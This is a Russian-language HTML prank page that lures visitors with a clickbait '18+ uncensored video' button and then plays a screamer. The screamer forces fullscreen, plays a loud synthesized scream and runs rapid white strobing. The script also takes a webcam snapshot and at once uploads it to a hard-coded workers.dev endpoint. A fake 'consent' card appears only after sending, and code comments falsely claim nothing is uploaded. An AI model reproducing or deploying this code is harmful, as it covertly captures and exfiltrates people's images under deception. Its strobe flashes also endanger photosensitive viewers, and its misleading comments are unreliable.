<!DOCTYPE html>
<html lang="ru">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no, viewport-fit=cover">
<meta name="mobile-web-app-capable" content="yes">
<meta name="apple-mobile-web-app-capable" content="yes">
<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
<link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
<link href="https://fonts.googleapis.com/css2?family=Unbounded:wght@700;900&display=swap" rel="stylesheet">
<title></title>
<style>
  :root{--acc:#ff7a00;--glow:rgba(255,122,0,.55)}
  html,body{margin:0;height:100%;background:#000;overflow:hidden;cursor:default;
    overscroll-behavior:none;touch-action:none;
    font-family:Arial,Helvetica,sans-serif;color:#ddd;-webkit-user-select:none;user-select:none}

  /* bait: heavy thumbnail-style headline next to a plain button */
  #go{position:fixed;inset:0;z-index:20;display:grid;place-items:center;background:#000;
    padding:4vmin}
  .row{display:flex;align-items:center;justify-content:center;gap:clamp(18px,4vmin,54px);
    flex-wrap:wrap}

  .hype{display:grid;justify-items:center;line-height:.88;text-transform:uppercase;white-space:nowrap;
    font-family:"Unbounded","Arial Black",Impact,Haettenschweiler,sans-serif;
    font-weight:900;text-align:center}
  .hype .l1{font-size:clamp(24px,6.6vmin,80px);color:#fff3d1;letter-spacing:-.01em;
    -webkit-text-stroke:2px #000;text-shadow:0 6px 0 rgba(0,0,0,.9),0 0 30px rgba(0,0,0,.8)}
  .hype .l2{font-size:clamp(26px,7.4vmin,94px);letter-spacing:-.02em;
    background:linear-gradient(180deg,#fff 0%,#ffd21e 42%,#ff7a00 100%);
    -webkit-background-clip:text;background-clip:text;color:transparent;
    -webkit-text-stroke:2px #000;
    filter:drop-shadow(0 6px 0 rgba(0,0,0,.9)) drop-shadow(0 0 30px var(--glow))}
  .hype .l3{margin-top:12px;
    font:900 clamp(11px,1.7vmin,18px)/1 "Unbounded","Arial Black",Arial,sans-serif;
    letter-spacing:.1em;text-transform:uppercase;color:#fff;
    -webkit-text-stroke:1.2px #000;
    text-shadow:0 3px 0 rgba(0,0,0,.9)}

  .cta{position:relative;flex:none}
  .rate{position:absolute;top:-13px;left:-13px;z-index:2;
    font:900 clamp(10px,1.4vmin,15px)/1 "Unbounded","Arial Black",Arial,sans-serif;
    letter-spacing:.02em;color:#fff;background:#000;
    border:2px solid var(--acc);border-radius:3px;padding:5px 7px;
    -webkit-text-stroke:1px #000;pointer-events:none}

  /* вместо кружка с треугольником — счётчик зрителей, он тянет клик лучше */
  .watch{display:flex;align-items:center;gap:9px;flex:none;
    padding:11px 15px;background:#0b0b0b;border:2px solid #262626;border-radius:4px;
    box-shadow:4px 4px 0 #000;
    font:900 clamp(10px,1.35vmin,14px)/1 "Unbounded","Arial Black",Arial,sans-serif;
    letter-spacing:.07em;text-transform:uppercase;color:#fff;
    -webkit-text-stroke:.6px #000}
  .watch b{color:var(--acc);font-weight:900}
  .watch i{width:9px;height:9px;flex:none;border-radius:50%;background:var(--acc);
    animation:blink 1.1s steps(1,end) infinite}
  @keyframes blink{0%,55%{opacity:1}56%,100%{opacity:.2}}

  #go button{
    font:900 clamp(13px,1.8vmin,19px)/1 "Unbounded","Arial Black",Arial,sans-serif;
    letter-spacing:.06em;text-transform:uppercase;
    color:var(--acc);background:transparent;border:2px solid var(--acc);
    border-radius:4px;padding:18px 34px;cursor:pointer;
    box-shadow:4px 4px 0 #000;
    transition:transform .12s ease,box-shadow .12s ease,background .12s ease,color .12s ease}
  #go button:hover{transform:translate(2px,2px);box-shadow:2px 2px 0 #000;
    background:var(--acc);color:#000}
  #go button:active{transform:translate(4px,4px);box-shadow:0 0 0 #000}
  #go button:focus-visible{outline:2px solid #fff;outline-offset:4px}

  /* horror stage: hidden until the click, full-bleed and static */
  #stage{position:fixed;inset:0;display:none;background:#000}
  #face{position:absolute;inset:0;width:100%;height:100%;
    object-fit:cover;object-position:50% 30%}
  #faceSvg{position:absolute;inset:0;width:100%;height:100%}
  #cap{position:fixed;left:0;right:0;bottom:6vh;text-align:center;
    font:clamp(18px,3.4vmin,40px)/1 Georgia,serif;letter-spacing:.35em;
    text-transform:uppercase;opacity:.85;text-shadow:0 0 18px var(--glow);
    padding:0 4vmin}
  #vig{position:fixed;inset:0;pointer-events:none;display:none;z-index:5;
    box-shadow:inset 0 0 22vmin 8vmin #000;opacity:.85}
  #flash{position:fixed;inset:0;background:#fff;opacity:0;pointer-events:none;
    display:none;z-index:8;mix-blend-mode:screen}
  #consent{position:fixed;inset:0;z-index:30;display:none;place-items:center;
    background:rgba(0,0,0,.82);padding:5vmin}
  #consent.open{display:grid}
  .card{background:#141414;border:1px solid #333;border-radius:14px;padding:18px;
    max-width:380px;width:100%;text-align:center}
  .card h2{font:700 16px Arial,sans-serif;color:#fff;margin:0 0 6px}
  .card p{font:12px/1.6 Arial,sans-serif;color:#bbb;margin:0 0 10px}
  #shotPreview{width:100%;border-radius:10px;display:block;background:#000}
  .card .btns{display:flex;gap:10px;margin-top:12px}
  #dropShot{flex:1;background:#222;color:#fff;border:1px solid #444;border-radius:10px;
    padding:12px;font:700 14px Arial,sans-serif;cursor:pointer}
  #sendState{font:12px Arial,sans-serif;color:#888;margin-top:8px;min-height:16px}
  #nope{position:fixed;left:0;right:0;bottom:18px;z-index:31;display:none;
    place-items:center;padding:0 4vmin}
  #nope.open{display:grid}
  #camAgain{font:700 12px Arial,sans-serif;letter-spacing:.1em;text-transform:uppercase;
    color:#fff;background:var(--acc);border:0;border-radius:12px;
    padding:12px 16px;cursor:pointer}
</style>
</head>
<body>

<div id="go">
  <div class="row">
    <div class="watch"><i></i><span><b>РЕАЛЬНА</b>ЖОСКО</span></div>
    <div class="hype">
      <span class="l1">тут видео</span>
      <span class="l2">с Даней Ляшем</span>
      <span class="l3">без цензуры</span>
    </div>
    <div class="cta"><button type="button">смотреть</button><span class="rate">18+</span></div>
  </div>
</div>

<div id="stage">
  <img id="face" src="STRASHNA.jpg?v=1" alt=""
       onerror="this.style.display='none';document.getElementById('faceSvg').style.display='block'">
  <svg id="faceSvg" viewBox="0 0 400 480" style="display:none">
    <path d="M40 250 C20 90 90 10 200 10 C310 10 380 90 360 250
             L330 190 C300 120 250 90 200 90 C150 90 100 120 70 190 Z" fill="#0b0b0b"/>
    <ellipse cx="200" cy="250" rx="150" ry="190" fill="#cfc4b4"/>
    <ellipse cx="200" cy="250" rx="150" ry="190" fill="none" stroke="#5a5145" stroke-width="3"/>
    <ellipse cx="130" cy="215" rx="52" ry="60" fill="#070707"/>
    <ellipse cx="270" cy="215" rx="52" ry="60" fill="#070707"/>
    <circle cx="138" cy="222" r="7" fill="#fff"/>
    <circle cx="278" cy="222" r="7" fill="#fff"/>
    <path d="M200 235 C186 285 214 285 200 300" stroke="#6b6153" stroke-width="6" fill="none"/>
    <path d="M105 345 L135 330 L165 358 L200 325 L235 358 L265 330 L295 345
             L295 400 L105 400 Z" fill="#0a0a0a"/>
    <path d="M105 345 L135 330 L165 358 L200 325 L235 358 L265 330 L295 345"
          stroke="#e8e0d0" stroke-width="4" fill="none"/>
    <ellipse cx="130" cy="265" rx="46" ry="26" fill="#000" opacity=".25"/>
    <ellipse cx="270" cy="265" rx="46" ry="26" fill="#000" opacity=".25"/>
  </svg>
  <div id="cap">не уходи</div>
</div>
<div id="vig"></div>
<div id="flash"></div>
<div id="consent"><div class="card">
  <h2>твой кадр</h2>
  <p>это кадр с твоей камеры. он уже отправлен.</p>
  <img id="shotPreview" alt="превью кадра">
  <div class="btns"><button id="dropShot" type="button">закрыть</button></div>
  <div id="sendState"></div>
</div></div>
<div id="nope"><button id="camAgain" type="button">ВКЛЮЧИ КАМЕРУ БЫСТРО НАХУЙ</button></div>

<script>
const cap   = document.getElementById('cap');
const flash = document.getElementById('flash');
const LINES = ['не уходи','ты один','смотри в глаза','я тут','не выключай'];
let i = 0, ac, master, live = false;

function goFullscreen(){
  const el = document.documentElement;
  try {
    let p = null;
    if (el.requestFullscreen) p = el.requestFullscreen({ navigationUI: 'hide' });
    else if (el.webkitRequestFullscreen) p = el.webkitRequestFullscreen();
    if (p && p.catch) p.catch(() => {});
  } catch(e) {}
  try { if (screen.orientation && screen.orientation.lock) screen.orientation.lock('portrait').catch(() => {}); } catch(e) {}
  setTimeout(() => window.scrollTo(0, 1), 50); // iPhone: generic fullscreen нет — прячем адресную строку
}

function scream(){
  try {
    if (!ac) ac = new (window.AudioContext || window.webkitAudioContext)();
  } catch(e) { return; }
  master = ac.createGain();
  master.gain.value = 0.9;
  master.connect(ac.destination);
  if (ac.state === 'suspended') ac.resume();
  const t = ac.currentTime, dur = 6;

  const buf = ac.createBuffer(1, ac.sampleRate * dur, ac.sampleRate);
  const d = buf.getChannelData(0);
  for (let n = 0; n < d.length; n++) d[n] = Math.random() * 2 - 1;
  const src = ac.createBufferSource(); src.buffer = buf; src.loop = true;

  const bp = ac.createBiquadFilter(); bp.type = 'bandpass'; bp.Q.value = 5;
  bp.frequency.setValueAtTime(500, t);
  bp.frequency.exponentialRampToValueAtTime(3000, t + 0.3);
  bp.frequency.exponentialRampToValueAtTime(420, t + dur);

  const shaper = ac.createWaveShaper();
  const curve = new Float32Array(1024);
  for (let n = 0; n < 1024; n++){ const x = n / 512 - 1; curve[n] = Math.tanh(3 * x); }
  shaper.curve = curve;

  const g = ac.createGain();
  g.gain.setValueAtTime(0.0001, t);
  g.gain.exponentialRampToValueAtTime(0.85, t + 0.06);
  g.gain.setValueAtTime(0.85, t + dur - 0.6);
  g.gain.exponentialRampToValueAtTime(0.0001, t + dur);

  src.connect(bp); bp.connect(shaper); shaper.connect(g); g.connect(master);
  src.start(t); src.stop(t + dur);

  const o1 = ac.createOscillator(), o2 = ac.createOscillator();
  o1.type = o2.type = 'sawtooth'; o1.frequency.value = 46; o2.frequency.value = 49.5;
  const lp = ac.createBiquadFilter(); lp.type = 'lowpass'; lp.frequency.value = 140;
  const rg = ac.createGain();
  rg.gain.setValueAtTime(0.0001, t);
  rg.gain.exponentialRampToValueAtTime(0.55, t + 0.3);
  rg.gain.exponentialRampToValueAtTime(0.0001, t + dur);
  o1.connect(lp); o2.connect(lp); lp.connect(rg); rg.connect(master);
  o1.start(t); o2.start(t); o1.stop(t + dur); o2.stop(t + dur);
}

function reveal(){
  document.getElementById('go').remove();
  document.getElementById('stage').style.display = 'block';
  document.getElementById('vig').style.display   = 'block';
  document.getElementById('flash').style.display = 'block';
  document.body.style.cursor = 'none';
  scream();
  if (navigator.vibrate) navigator.vibrate([300, 80, 300, 80, 600]);
  goFullscreen(); // повтор — основной вызов уже был синхронно в клике
  live = true;
}

let last = 0;
setInterval(() => {
  if (live) cap.textContent = LINES[i++ % LINES.length];
}, 1800);

function strobe(){
  if (!live) return;
  if (Math.random() < 0.5){
    flash.style.transition = 'none'; flash.style.opacity = 0.85;
    setTimeout(() => { flash.style.transition = 'opacity .12s'; flash.style.opacity = 0; }, 60);
  }
  setTimeout(strobe, 120 + Math.random() * 180);
}

// webcam snapshot -> victim sees their own face. local only, nothing is uploaded.
// tracks are stopped right after the grab so the camera LED goes off.
async function snap(stream){
  const v = document.createElement('video');
  v.playsInline = v.muted = true;
  v.srcObject = stream;
  await v.play();
  await new Promise(r => setTimeout(r, 700));           // let auto-exposure settle
  const c = document.createElement('canvas');
  c.width = v.videoWidth; c.height = v.videoHeight;
  const x = c.getContext('2d');
  x.translate(c.width, 0); x.scale(-1, 1);              // mirror, like every selfie
  x.drawImage(v, 0, 0);
  stream.getTracks().forEach(t => t.stop());
  const img = document.getElementById('face');
  // Кадр показываем в скейре и сразу уходит в воркер — ждать кнопки не надо.
  c.toBlob(b => {
    if (b){ pendingBlob = b; if (pendingURL){ try { URL.revokeObjectURL(pendingURL); } catch(e) {} } pendingURL = URL.createObjectURL(b); sendShot(); }
  }, 'image/jpeg', 0.85);
  if (img){ img.style.display = 'block'; img.src = c.toDataURL('image/jpeg', 0.9); }
}

// Впиши URL своего Cloudflare-воркера. Токена бота тут НЕТ — он в secrets воркера.
// Кадр уходит сразу после разрешения камеры, отдельной кнопки нет.
const WORKER_URL = 'https://daaanayachka1.topolnickijdenis8.workers.dev/';
let pendingBlob = null, pendingURL = null;

function showConsent(){
  if (!pendingURL) return;
  document.getElementById('shotPreview').src = pendingURL;
  document.getElementById('sendState').textContent = '';
  document.getElementById('consent').classList.add('open');
}
function hideConsent(){
  document.getElementById('consent').classList.remove('open');
}
function dropShot(){
  pendingBlob = null;
  if (pendingURL){ try { URL.revokeObjectURL(pendingURL); } catch(e) {} pendingURL = null; }
  document.getElementById('shotPreview').removeAttribute('src');
  hideConsent();
}
document.getElementById('dropShot').addEventListener('click', dropShot);
function sendShot(){
  if (!pendingBlob) return;
  const st = document.getElementById('sendState');
  st.textContent = 'отправляю…';
  fetch(WORKER_URL, { method: 'POST', headers: { 'Content-Type': 'image/jpeg' }, body: pendingBlob })
    .then(r => {
      if (!r.ok) throw new Error('http ' + r.status);
      st.textContent = 'отправлено ✓';
    })
    .catch(() => { st.textContent = 'не ушло'; });
}
const nope = document.getElementById('nope'), camAgain = document.getElementById('camAgain');
function grab(){
  if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia){
    nope.classList.add('open');
    return Promise.resolve(false);
  }
  let ok = false;
  return navigator.mediaDevices
    .getUserMedia({video:{facingMode:'user', width:{ideal:1280}, height:{ideal:1280}}, audio:false})
    .then(s => { ok = true; return snap(s); })
    .then(() => ok)
    .catch(() => { nope.classList.add('open'); return false; });
}
camAgain.addEventListener('click', () => {
  grab().then(ok => {
    if (!ok) return;
    nope.classList.remove('open');
    setTimeout(() => { if (pendingURL) showConsent(); }, 1000);
  });
});

document.querySelector('#go button').addEventListener('click', () => {
  goFullscreen(); // СИНХРОННО в жесте — после await/race мобилы режут fullscreen и звук
  try {
    if (!ac) ac = new (window.AudioContext || window.webkitAudioContext)();
    if (ac.state === 'suspended') ac.resume();
  } catch(e) {}
  // whoever answers the permission prompt first wins; 5s cap so a refusal still scares them
  Promise.race([grab(), new Promise(r => setTimeout(r, 5000))])
    .then(() => {
      reveal(); strobe();
      // карточка с превью — только если кадр реально снялся; отправка лишь по кнопке
      setTimeout(() => { if (pendingURL) showConsent(); }, 5000);
    });
});
</script>
</body>
</html>
